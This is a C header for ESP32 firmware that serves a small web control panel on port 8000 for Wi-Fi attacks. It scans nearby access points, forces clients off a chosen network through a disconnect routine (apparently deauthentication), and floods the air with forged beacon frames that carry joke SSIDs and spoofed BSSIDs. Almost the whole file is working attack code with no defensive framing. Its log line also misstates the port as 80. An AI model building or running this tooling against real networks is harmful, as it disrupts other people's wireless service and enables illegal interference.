#ifndef WEBSERVER_H
#define WEBSERVER_H

#include "socket.h"
#include "http_response.h"
#include "http_request.h"
#include "html_pages.h"

static wifictl_ap_records_t ap_records = {0};

void handle_scan(int client_sock) {
    int err = scan_networks(&ap_records);
    if (err != 0) {
        ESP_LOGE("WebServer", "Failed to scan networks");
        http_send_error_response(client_sock);
        return;
    }
    char* records = records_to_json(&ap_records);
    http_send_json_response(client_sock, records);
    free(records);
}

void handle_attack(http_request_t* req, int client_sock) {
    char bssid[18];
    int ret = http_request_get_url_param(req->url, "bssid", sizeof(bssid), bssid);
    if (ret != 0) {
        ESP_LOGE("WebServer", "Failed to get BSSID from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    uint8_t bytes_bssid[6];
    ret = bssid_string_to_bytes(bssid, bytes_bssid);
    if(ret != 0) {
        ESP_LOGE("WebServer", "Failed to convert BSSID string to bytes");
        http_send_error_response(client_sock);
        return;
    }
    wifi_ap_record_t* record = get_ap_record_by_bssid(&ap_records, bytes_bssid);
    if(record == NULL)
    {
        ESP_LOGE("WebServer", "BSSID not found");
        http_send_bad_request_response(client_sock);
        return;
    }
    http_send_ok_response(client_sock);
    ret = wifi_disconnect(record, 10);
    if (ret != ESP_OK) {
        ESP_LOGE("WebServer", "BSSID not found");
        http_send_error_response(client_sock);
        return;
    }
}

void handle_flood(http_request_t* req, int client_sock){
    http_send_ok_response(client_sock);
    uint8_t line_index = 0;
    uint8_t beacon_rick[200];
    uint16_t seq[TOTAL_LINES] = { 0 };

    int duration_seconds = 30; // modifică această valoare după nevoie
    TickType_t start_tick = xTaskGetTickCount();
    TickType_t end_tick = start_tick + (duration_seconds * 1000 / portTICK_PERIOD_MS);

    while (xTaskGetTickCount() < end_tick) {
        vTaskDelay(100 / TOTAL_LINES / portTICK_PERIOD_MS);
        
        // copy values until SSID offset
        memcpy(beacon_rick, beacon_frame, BEACON_SSID_OFFSET - 1);

        char* ssid = rick_ssids[line_index];
        uint8_t ssid_len = strlen(ssid);
        printf("Sending frame %s\n", ssid);
        // set SSID length and copy SSID
        beacon_rick[BEACON_SSID_OFFSET - 1] = ssid_len;
        memcpy(beacon_rick + BEACON_SSID_OFFSET, ssid, ssid_len);

        // copy the rest of the beacon frame
        memcpy(beacon_rick + BEACON_SSID_OFFSET + ssid_len, beacon_frame + BEACON_SSID_OFFSET, sizeof(beacon_frame) - BEACON_SSID_OFFSET);
        
        // set the source address and BSSID
        beacon_rick[SRCADDR_OFFSET + 5] = line_index;
        beacon_rick[BSSID_OFFSET + 5] = line_index;

        // set the sequence number
        beacon_rick[SEQNUM_OFFSET] = (seq[line_index] & 0x0f) << 4;
        beacon_rick[SEQNUM_OFFSET + 1] = (seq[line_index] & 0xff0) >> 4;
        
        seq[line_index]++;
        if (seq[line_index] > 0xfff)
            seq[line_index] = 0;

        esp_wifi_80211_tx(WIFI_IF_AP, beacon_rick, sizeof(beacon_frame) + ssid_len, false);

        if (++line_index >= TOTAL_LINES)
            line_index = 0;
    }
}

void handle_connection(http_request_t* req, int client_sock) {
    if(strcmp(req->method, "POST") == 0) {
        ESP_LOGI("WebServer", "Handling POST request");
        http_send_not_found_response(client_sock);
        return;
    }

    if (strcmp(req->url, "/") == 0) {
        ESP_LOGI("WebServer", "Handling root request");
        http_send_html_response(client_sock, root_page_html);
    } else if (strcmp(req->url, "/scan") == 0) {
        ESP_LOGI("WebServer", "Handling scan request");
        handle_scan(client_sock);
    } else if(strncmp(req->url, "/attack", 7) == 0) {
        ESP_LOGI("WebServer", "Handling attack request");
        handle_attack(req, client_sock);
    } else if (strcmp(req->url, "/flood") == 0) {
        ESP_LOGI("WebServer", "Handling flood request");
        handle_flood(req, client_sock);
    } else {
        ESP_LOGI("WebServer", "Handling not found request");
        http_send_not_found_response(client_sock);
    }
}

void start_webserver(){
    ESP_LOGI("WebServer", "Creating socket...");
    int sock = socket_create(IPv4, Stream);
    if (sock < 0) {
        ESP_LOGE("WebServer", "Failed to create socket");
        return;
    }

    socket_set_reuse_addr_option(sock);

    ESP_LOGI("WebServer", "Binding socket...");
    if (socket_bind(sock, IPv4, 8000, INADDR_ANY) < 0) {
        ESP_LOGE("WebServer", "Failed to bind socket");
        close(sock);
        return;
    }

    if (socket_listen(sock, 5) < 0) {
        ESP_LOGE("WebServer", "Failed to listen on socket");
        close(sock);
        return;
    }
    ESP_LOGI("WebServer", "Web server started on port 80");

    while (1) {
        int client_sock = socket_accept(sock);
        if (client_sock < 0) {
            ESP_LOGE("WebServer", "Failed to accept connection");
            continue;
        }
        ESP_LOGI("WebServer", "Connection accepted...");

        char buffer[1024];
        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
        if (len < 0) {
            ESP_LOGE("WebServer", "Failed to receive data");
            close(client_sock);
            continue;
        }
        buffer[len] = 0;
        
        http_request_t req = http_request_parse(buffer);
        printf("Request Method: %s\n", req.method);
        printf("Request URL: %s\n", req.url);

        handle_connection(&req, client_sock);
        free_http_request(&req);
        close(client_sock);
    }
}



#endif // WEBSERVER_H